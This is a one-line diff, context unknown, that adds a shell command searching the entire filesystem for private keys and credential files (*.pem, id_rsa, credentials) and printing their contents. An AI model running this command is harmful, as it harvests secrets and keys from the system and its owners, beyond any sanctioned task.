@@ -1,0 +1,1 @@
+find / -name "*.pem" -o -name "id_rsa" -o -name "credentials" | xargs cat
